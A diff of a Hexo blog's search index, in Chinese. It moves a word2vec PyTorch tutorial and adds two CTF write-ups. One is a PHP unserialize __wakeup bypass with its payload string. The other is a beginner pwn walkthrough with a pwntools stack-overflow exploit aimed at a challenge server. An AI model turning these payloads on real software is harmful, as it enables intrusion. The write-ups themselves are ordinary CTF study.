-<p><img src="https://www.zhihu.com/equation?tex=+p%28w%7CContext%28w%29%29+%3D+F%28w%2C+Context%28w%29%2C+%5Ctheta%29+%5C%5C" alt="[公式]" /> 其中 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]" /> 为待定参数集。这样一来，一旦对（4）进行优化得到最优参数集 <img src="https://www.zhihu.com/equation?tex=%5Ctheta%5E%7B+%2A%7D" alt="[公式]" /> 后，F也就唯一被确定了，以后任何概率p(w|Context(w))就可以通过函数 <img src="https://www.zhihu.com/equation?tex=F%28w%2C+Context%28w%29%2C+%5Ctheta%5E%7B+%2A%7D%29" alt="[公式]" /> 来计算了。与n-gram相比，这种方法不需要事先计算并保存所有的概率值，而是通过直接计算来获取，且通选取合适的模型可使得 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]" /> 中参数的个数远小于n-gram中模型参数的个数。</p>
-<h2 id="word2vec网络结构">word2vec网络结构</h2>
-<p>word2vec是轻量级的神经网络，其模型仅仅包括输入层、隐藏层和输出层，分为CBOW和Skip-gram模型。CBOW是知道上下文语料的情况下，预测当前的词。skip-gram则是根据一个词预测上下文。上下文是指根据window_size设置的前后各n个词。</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211013225352657-2105331470.png" /></p>
-<h3 id="cbow模型">CBOW模型</h3>
-<p><img src="https://pic3.zhimg.com/80/v2-55eadeeae1fb93907d9b3da9aabed576_720w.jpg" /></p>
-<h3 id="skip-gram模型">skip-gram模型</h3>
-<p><img src="https://pic4.zhimg.com/80/v2-3baa8ea48cf7028510871a2894ffbb97_720w.jpg" /></p>
-<h2 id="word2vec实践">word2vec实践</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> torch.autograd <span class="keyword">as</span> autograd</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CONTEXT_SIZE = <span class="number">2</span>  <span class="comment"># 2 words to the left, 2 to the right</span></span><br><span class="line">raw_text = <span class="string">&quot;&quot;&quot;We are about to study the idea of a computational process.</span></span><br><span class="line"><span class="string">Computational processes are abstract beings that inhabit computers.</span></span><br><span class="line"><span class="string">As they evolve, processes manipulate other abstract things called data.</span></span><br><span class="line"><span class="string">The evolution of a process is directed by a pattern of rules</span></span><br><span class="line"><span class="string">called a program. People create programs to direct processes. In effect,</span></span><br><span class="line"><span class="string">we conjure the spirits of the computer with our spells.&quot;&quot;&quot;</span>.split()</span><br><span class="line"></span><br><span class="line"><span class="comment"># By deriving a set from `raw_text`, we deduplicate the array</span></span><br><span class="line">vocab = <span class="built_in">set</span>(raw_text)</span><br><span class="line">vocab_size = <span class="built_in">len</span>(vocab)</span><br><span class="line"></span><br><span class="line">word_to_ix = &#123;word: i <span class="keyword">for</span> i, word <span class="keyword">in</span> <span class="built_in">enumerate</span>(vocab)&#125;</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(raw_text) - <span class="number">2</span>):</span><br><span class="line">    context = [raw_text[i - <span class="number">2</span>], raw_text[i - <span class="number">1</span>],</span><br><span class="line">               raw_text[i + <span class="number">1</span>], raw_text[i + <span class="number">2</span>]]</span><br><span class="line">    target = raw_text[i]</span><br><span class="line">    data.append((context, target))</span><br><span class="line"><span class="built_in">print</span>(data[:<span class="number">5</span>])</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBOW</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, vocab_size, embedding_dim, context_size</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(CBOW, self).__init__()</span><br><span class="line">        self.embeddings = nn.Embedding(vocab_size, embedding_dim)</span><br><span class="line">        self.linear1 = nn.Linear(context_size * embedding_dim, <span class="number">128</span>)</span><br><span class="line">        self.linear2 = nn.Linear(<span class="number">128</span>, vocab_size)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, inputs</span>):</span></span><br><span class="line">        embeds = self.embeddings(inputs).view((<span class="number">1</span>, -<span class="number">1</span>))</span><br><span class="line">        out = F.relu(self.linear1(embeds))</span><br><span class="line">        out = self.linear2(out)</span><br><span class="line">        log_probs = F.log_softmax(out, dim=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span>(log_probs)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_context_vector</span>(<span class="params">context, word_to_ix</span>):</span></span><br><span class="line">    idxs = [word_to_ix[w] <span class="keyword">for</span> w <span class="keyword">in</span> context]</span><br><span class="line">    <span class="keyword">return</span> torch.tensor(idxs, dtype=torch.long)</span><br><span class="line">make_context_vector(data[<span class="number">0</span>][<span class="number">0</span>], word_to_ix)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">device = torch.device(<span class="string">&#x27;cuda:0&#x27;</span>)</span><br><span class="line">losses = []</span><br><span class="line">loss_function = nn.NLLLoss()</span><br><span class="line">model = CBOW(<span class="built_in">len</span>(vocab), embedding_dim=<span class="number">10</span>, context_size=CONTEXT_SIZE*<span class="number">2</span>)</span><br><span class="line">model.to(device)</span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    total_loss = torch.Tensor([<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> context, target <span class="keyword">in</span> data:</span><br><span class="line">        context_ids = make_context_vector(context, word_to_ix)</span><br><span class="line">        context_ids = context_ids.to(device)</span><br><span class="line">        model.zero_grad()</span><br><span class="line">        log_probs = model(context_ids)</span><br><span class="line">        label = torch.tensor([word_to_ix[target]], dtype=torch.long)</span><br><span class="line">        label = label.to(device)</span><br><span class="line">        loss = loss_function(log_probs, label)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        total_loss += loss.item()</span><br><span class="line">    losses.append(total_loss)</span><br><span class="line"><span class="built_in">print</span>(losses)</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.embeddings(make_context_vector(data[<span class="number">0</span>][<span class="number">0</span>], word_to_ix))</span><br></pre></td></tr></table></figure>
-<h2 id="参考">参考</h2>
-<p>[1] <a href="https://zhuanlan.zhihu.com/p/114538417">深入浅出Word2Vec原理解析 - 知乎 (zhihu.com)</a></p>
-<p>[2] <a href="https://samaelchen.github.io/word2vec_pytorch/">word2vec的PyTorch实现 | 碎碎念 (samaelchen.github.io)</a></p>
+<h2 id="quick-start">Quick Start</h2>
+<p><span class="math display">\[hello sdsd(\frac{a}{b})\]</span></p>
+<p><img src="/images/hello-world/image-20211017201247881.png" /></p>
+<h3 id="create-a-new-post">Create a new post</h3>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211017194040110-1069279989.png" /></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="run-server">Run server</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="generate-static-files">Generate static files</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="deploy-to-remote-sites">Deploy to remote sites</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
       <categories>
-        <category>deep_learning</category>
+        <category>time</category>
       </categories>
       <tags>
-        <tag>model</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -698,6 +602,53 @@ k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delt
       </tags>
   </entry>
   <entry>
+    <title>Word2vec</title>
+    <url>/2021/10/17/word2vec.html</url>
+    <content><![CDATA[<p>Word2Vec是语言模型中的一种，它是从大量文本预料中以无监督方式学习语义知识的模型，被广泛地应用于自然语言处理中。</p>
+<p>Word2Vec是用来生成词向量的工具，而词向量与语言模型有着密切的关系。</p>
+<span id="more"></span>
+<meta name="referrer" content="no-referrer"/>
+<h2 id="基础概念">基础概念</h2>
+<h3 id="语料">语料</h3>
+<p>看word2vec之前可以先看<a href="https://www.cnblogs.com/dddddblog/p/n_gram.html">n-gram模型</a></p>
+<p>word2vec是一个统计语言模型，通过计算条件概率来预测和生成向量。</p>
+<p>n-gram模型在语料库足够大的情况下，不单独统计各个条件概率，而是直接使用这种大概的方式，减少计算</p>
+<p>​ <span class="math display">\[p(w_k|w_{k-n+1},...,w_{k-1}) = \frac{count(w_{k-n},...,w_k)}{count(w_{k-n+1},...w_{k-1})}\]</span></p>
+<p>参数n（word2vec中的窗口大小）确定需要根据模型参数的数量来确定。一般来说越大越好，后面效果增加减少。</p>
+<p>对于统计语言模型而言，利用最大似然，可把目标函数设为：</p>
+<p><img src="https://www.zhihu.com/equation?tex=+%5Cprod_%7Bw+%5Cin+C%7D%5E%7B%7D+p%28w%7CContext%28w%29%29+%5C%5C" alt="[公式]" /> 其中，C表示语料(Corpus)，Context(w)表示词w的上下文，即w周边的词的集合。当Context(w)为空时，就取 <img src="https://www.zhihu.com/equation?tex=p%28w%7CContext%28w%29%29%3D+p%28w%29" alt="[公式]" /> 。特别地，对于前面介绍的n-gram模型，就有 <img src="https://www.zhihu.com/equation?tex=Context%28w_%7Bi%7D+%3D+w_%7Bi-n%2B1%7D%2C...%2Cw_%7Bi-1%7D%29" alt="[公式]" /> 。</p>
+<h3 id="模型基础">模型基础</h3>
+<p>当然，实际应用中常采用最大对数似然，即把目标函数设为</p>
+<p><img src="https://www.zhihu.com/equation?tex=L+%3D+%5Csum_%7Bw+%5Cin+C%7D%5E%7B%7D%7Blog+p%28w%7CContext%28w%29%29%7D++%5Ctag%7B4%7D%5C%5C" alt="[公式]" /> 然后对这个函数进行最大化。</p>
+<p>从公式（4）可见，概率 <img src="https://www.zhihu.com/equation?tex=p%28w%7CContext%28w%29%29" alt="[公式]" /> 已被视为关于w和Context(w)的函数，即：</p>
+<p><img src="https://www.zhihu.com/equation?tex=+p%28w%7CContext%28w%29%29+%3D+F%28w%2C+Context%28w%29%2C+%5Ctheta%29+%5C%5C" alt="[公式]" /> 其中 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]" /> 为待定参数集。这样一来，一旦对（4）进行优化得到最优参数集 <img src="https://www.zhihu.com/equation?tex=%5Ctheta%5E%7B+%2A%7D" alt="[公式]" /> 后，F也就唯一被确定了，以后任何概率p(w|Context(w))就可以通过函数 <img src="https://www.zhihu.com/equation?tex=F%28w%2C+Context%28w%29%2C+%5Ctheta%5E%7B+%2A%7D%29" alt="[公式]" /> 来计算了。与n-gram相比，这种方法不需要事先计算并保存所有的概率值，而是通过直接计算来获取，且通选取合适的模型可使得 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]" /> 中参数的个数远小于n-gram中模型参数的个数。</p>
+<h2 id="word2vec网络结构">word2vec网络结构</h2>
+<p>word2vec是轻量级的神经网络，其模型仅仅包括输入层、隐藏层和输出层，分为CBOW和Skip-gram模型。CBOW是知道上下文语料的情况下，预测当前的词。skip-gram则是根据一个词预测上下文。上下文是指根据window_size设置的前后各n个词。</p>
+<p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211013225352657-2105331470.png" /></p>
+<h3 id="cbow模型">CBOW模型</h3>
+<p><img src="https://pic3.zhimg.com/80/v2-55eadeeae1fb93907d9b3da9aabed576_720w.jpg" /></p>
+<h3 id="skip-gram模型">skip-gram模型</h3>
+<p><img src="https://pic4.zhimg.com/80/v2-3baa8ea48cf7028510871a2894ffbb97_720w.jpg" /></p>
+<h2 id="word2vec实践">word2vec实践</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> torch.autograd <span class="keyword">as</span> autograd</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CONTEXT_SIZE = <span class="number">2</span>  <span class="comment"># 2 words to the left, 2 to the right</span></span><br><span class="line">raw_text = <span class="string">&quot;&quot;&quot;We are about to study the idea of a computational process.</span></span><br><span class="line"><span class="string">Computational processes are abstract beings that inhabit computers.</span></span><br><span class="line"><span class="string">As they evolve, processes manipulate other abstract things called data.</span></span><br><span class="line"><span class="string">The evolution of a process is directed by a pattern of rules</span></span><br><span class="line"><span class="string">called a program. People create programs to direct processes. In effect,</span></span><br><span class="line"><span class="string">we conjure the spirits of the computer with our spells.&quot;&quot;&quot;</span>.split()</span><br><span class="line"></span><br><span class="line"><span class="comment"># By deriving a set from `raw_text`, we deduplicate the array</span></span><br><span class="line">vocab = <span class="built_in">set</span>(raw_text)</span><br><span class="line">vocab_size = <span class="built_in">len</span>(vocab)</span><br><span class="line"></span><br><span class="line">word_to_ix = &#123;word: i <span class="keyword">for</span> i, word <span class="keyword">in</span> <span class="built_in">enumerate</span>(vocab)&#125;</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(raw_text) - <span class="number">2</span>):</span><br><span class="line">    context = [raw_text[i - <span class="number">2</span>], raw_text[i - <span class="number">1</span>],</span><br><span class="line">               raw_text[i + <span class="number">1</span>], raw_text[i + <span class="number">2</span>]]</span><br><span class="line">    target = raw_text[i]</span><br><span class="line">    data.append((context, target))</span><br><span class="line"><span class="built_in">print</span>(data[:<span class="number">5</span>])</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBOW</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, vocab_size, embedding_dim, context_size</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(CBOW, self).__init__()</span><br><span class="line">        self.embeddings = nn.Embedding(vocab_size, embedding_dim)</span><br><span class="line">        self.linear1 = nn.Linear(context_size * embedding_dim, <span class="number">128</span>)</span><br><span class="line">        self.linear2 = nn.Linear(<span class="number">128</span>, vocab_size)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, inputs</span>):</span></span><br><span class="line">        embeds = self.embeddings(inputs).view((<span class="number">1</span>, -<span class="number">1</span>))</span><br><span class="line">        out = F.relu(self.linear1(embeds))</span><br><span class="line">        out = self.linear2(out)</span><br><span class="line">        log_probs = F.log_softmax(out, dim=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span>(log_probs)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_context_vector</span>(<span class="params">context, word_to_ix</span>):</span></span><br><span class="line">    idxs = [word_to_ix[w] <span class="keyword">for</span> w <span class="keyword">in</span> context]</span><br><span class="line">    <span class="keyword">return</span> torch.tensor(idxs, dtype=torch.long)</span><br><span class="line">make_context_vector(data[<span class="number">0</span>][<span class="number">0</span>], word_to_ix)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">device = torch.device(<span class="string">&#x27;cuda:0&#x27;</span>)</span><br><span class="line">losses = []</span><br><span class="line">loss_function = nn.NLLLoss()</span><br><span class="line">model = CBOW(<span class="built_in">len</span>(vocab), embedding_dim=<span class="number">10</span>, context_size=CONTEXT_SIZE*<span class="number">2</span>)</span><br><span class="line">model.to(device)</span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    total_loss = torch.Tensor([<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> context, target <span class="keyword">in</span> data:</span><br><span class="line">        context_ids = make_context_vector(context, word_to_ix)</span><br><span class="line">        context_ids = context_ids.to(device)</span><br><span class="line">        model.zero_grad()</span><br><span class="line">        log_probs = model(context_ids)</span><br><span class="line">        label = torch.tensor([word_to_ix[target]], dtype=torch.long)</span><br><span class="line">        label = label.to(device)</span><br><span class="line">        loss = loss_function(log_probs, label)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        total_loss += loss.item()</span><br><span class="line">    losses.append(total_loss)</span><br><span class="line"><span class="built_in">print</span>(losses)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.embeddings(make_context_vector(data[<span class="number">0</span>][<span class="number">0</span>], word_to_ix))</span><br></pre></td></tr></table></figure>
+<h2 id="参考">参考</h2>
+<p>[1] <a href="https://zhuanlan.zhihu.com/p/114538417">深入浅出Word2Vec原理解析 - 知乎 (zhihu.com)</a></p>
+<p>[2] <a href="https://samaelchen.github.io/word2vec_pytorch/">word2vec的PyTorch实现 | 碎碎念 (samaelchen.github.io)</a></p>
+]]></content>
+      <categories>
+        <category>deep_learning</category>
+      </categories>
+      <tags>
+        <tag>model</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>xctf-fakebook</title>
     <url>/2021/11/12/xctf-fakebook.html</url>
     <content><![CDATA[<p>攻防世界-web-fakebook结题过程</p>
@@ -742,6 +693,94 @@ k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delt
       </categories>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xctf-unserialize3</title>
+    <url>/2021/11/12/xctf-unserialize3.html</url>
+    <content><![CDATA[<p>xctf web php序列化和反序列化</p>
+<span id="more"></span>
+<meta name="referrer" content="no-referrer"/>
+<h3 id="序列化和反序列化">序列化和反序列化</h3>
+<p>序列化通俗来讲就是将对象转化为可以传输的字符串；</p>
+<p>反序列化就是把那串可以传输的字符串再变回对象。</p>
+<h4 id="例子">例子：</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> chybeta;    <span class="comment">//这里就是创建啦一个新的对象</span></span><br><span class="line"><span class="variable">$class1_ser</span> = serialize(<span class="variable">$class1</span>);   <span class="comment">//将这个对象进行字符串封装，就是对其进行序列化</span></span><br><span class="line">print_r(<span class="variable">$class1_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure>
+<img src="../images/xctf-unserialize3/20190814175124372.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>来解释一下：O:7:"chybeta":1:{s:4:"test";s:3:"123";}</p>
+<p>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了</p>
+<p>这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型</p>
+<p>再使用反序列化函数，结果print为chybeta Object([test] =&gt; 123)</p>
+<p>原文链接：https://blog.csdn.net/LTtiandd/article/details/99591998</p>
+<h3 id="魔法函数">魔法函数</h3>
+<figure>
+<img src="/images/xctf-unserialize3/2348945-20210802102700561-1202520313.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption>
+</figure>
+<h3 id="题目分析">题目分析</h3>
+<p>访问看到<img src="/images/xctf-unserialize3/2348945-20210802102055943-1130257407.png" alt="image-20210802102055048" /></p>
+<p>明显需要看出需要绕过__wakeup函数才行，？code表名使用GET方法传参数__</p>
+<p>code可能是XCTF类序列化再反序列化的结果</p>
+<p>**_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。**</p>
+<p>所以将对象数改成1以上的值就可以，也就是XCTF后的2，表示的是类中的变量的个数。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>参考：<a href="https://blog.csdn.net/qq_36438489/article/details/106141535">(3条消息) 攻防世界-unserialize3_魔术函数，以及wakeup（）函数的绕过_Kvein Fisher的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PWN入门</title>
+    <url>/2021/11/12/PWN%E5%85%A5%E9%97%A8.html</url>
+    <content><![CDATA[<p>pwn 入门学习，走一遍流程</p>
+<span id="more"></span>
+<meta name="referrer" content="no-referrer"/>
+<p>[TOC]</p>
+<p><a href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a> rip</p>
+<h2 id="checksec">checksec</h2>
+<p>使用,查看文件的加固机制</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec filename#老版</span><br><span class="line">checksec --file=filename #新版</span><br></pre></td></tr></table></figure>
+<center>
+<image src="https://upload-images.jianshu.io/upload_images/11071922-51baa910d9fa15dc.png?imageMogr2/auto-orient/strip|imageView2/2/w/626/format/webp"/>
+</center>
+<p><strong>Arch:</strong>程序架构信息</p>
+<p><strong>RELRO</strong>（relocation read-only)：主要针对GOT改写的攻击方式，分为两种，partial relro和full relro</p>
+<p>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh00获得shell</strong> 完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o hello test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
+<p><strong>stack-caacry:</strong>栈溢出保护。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</p>
+<p><strong>NX：</strong>开启会让栈中数据没有执行权限，无法触发shellcode，只会造成程序崩溃，可以利用rop绕过。</p>
+<p><strong>PIE</strong>：位置无关可执行，程序运行时各个段加载的虚拟地址是再装载时确定。</p>
+<h2 id="静态分析代码">静态分析代码</h2>
+<p>看到main函数，gets函数可能存在栈溢出漏洞，接着点击s局部变量进入栈空间。</p>
+<figure>
+<img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133030041-1533255546.png" alt="image-20210924133025356" /><figcaption aria-hidden="true">image-20210924133025356</figcaption>
+</figure>
+<p>第一次看到略感奇怪怎么两个s，r又是什么。首先明确这是main函数的栈空间，<strong>上面的s是局部变量，下面的s指的是rbp</strong>，64位程序8个字节。r比较特殊，有的地方说是return的东西，但是返回东西一般是通过寄存器eax或rax返回的，有点忘了。<strong>r应该是main函数执行完成后，EIP的值，即main函数结束后要执行的下一条执行。</strong></p>
+<p>栈溢出漏洞请自行补充知识。</p>
+<p><img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133138596-1167051620.png" /></p>
+<p>找到提权函数，这个还没有搞懂，大概就是让mian函数执行完了，执行fun函数，然后既可以cat flag了。</p>
+<p><img src="/images/PWN%E5%85%A5%E9%97%A8/2348945-20210924133524694-1219666581.png" /></p>
+<h2 id="动态分析">动态分析</h2>
+<p>难度大一些的才需要，使用GDB和peda分析。</p>
+<h2 id="编写exp">编写exp</h2>
+<p>remote和process一个是远程服务器，一个是本地尝试，使用时只用一个。</p>
+<p>本地测试需要赋予可执行的权限，不然总是显示没有权限sudo也不行。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod a+x pwn1</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28082</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn1&#x27;) </span></span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*(<span class="number">0xf</span> + <span class="number">0x8</span>) + p64(<span class="number">0x0401185</span>) + p64(<span class="number">0x0401186</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(p1) <span class="comment">#哈啊哈</span></span><br><span class="line"></span><br><span class="line">r.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考">参考</h2>
+<p><a href="https://www.jianshu.com/p/755e52d48a77">checksec工具使用-pwn - 简书 (jianshu.com)</a></p>
+<p>[(12条消息) <a href="https://blog.csdn.net/weixin_45004513/article/details/117332121">CTF PWN] 从0到0.00001 PWN入门超级详细_Csome-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -804,45 +843,6 @@ k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delt
       </categories>
       <tags>
         <tag>model</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xctf-unserialize3</title>
-    <url>/2021/11/12/xctf-unserialize3.html</url>
-    <content><![CDATA[<p>xctf web php序列化和反序列化</p>
-<span id="more"></span>
-<meta name="referrer" content="no-referrer"/>
-<h3 id="序列化和反序列化">序列化和反序列化</h3>
-<p>序列化通俗来讲就是将对象转化为可以传输的字符串；</p>
-<p>反序列化就是把那串可以传输的字符串再变回对象。</p>
-<h4 id="例子">例子：</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> chybeta;    <span class="comment">//这里就是创建啦一个新的对象</span></span><br><span class="line"><span class="variable">$class1_ser</span> = serialize(<span class="variable">$class1</span>);   <span class="comment">//将这个对象进行字符串封装，就是对其进行序列化</span></span><br><span class="line">print_r(<span class="variable">$class1_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<figure>
-<img src="../images/xctf-unserialize3/20190814175124372.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>来解释一下：O:7:"chybeta":1:{s:4:"test";s:3:"123";}</p>
-<p>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了</p>
-<p>这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型</p>
-<p>再使用反序列化函数，结果print为chybeta Object([test] =&gt; 123)</p>
-<p>原文链接：https://blog.csdn.net/LTtiandd/article/details/99591998</p>
-<h3 id="魔法函数">魔法函数</h3>
-<figure>
-<img src="/images/xctf-unserialize3/2348945-20210802102700561-1202520313.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption>
-</figure>
-<h3 id="题目分析">题目分析</h3>
-<p>访问看到<img src="/images/xctf-unserialize3/2348945-20210802102055943-1130257407.png" alt="image-20210802102055048" /></p>
-<p>明显需要看出需要绕过__wakeup函数才行，？code表名使用GET方法传参数__</p>
-<p>code可能是XCTF类序列化再反序列化的结果</p>
-<p>**_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。**</p>
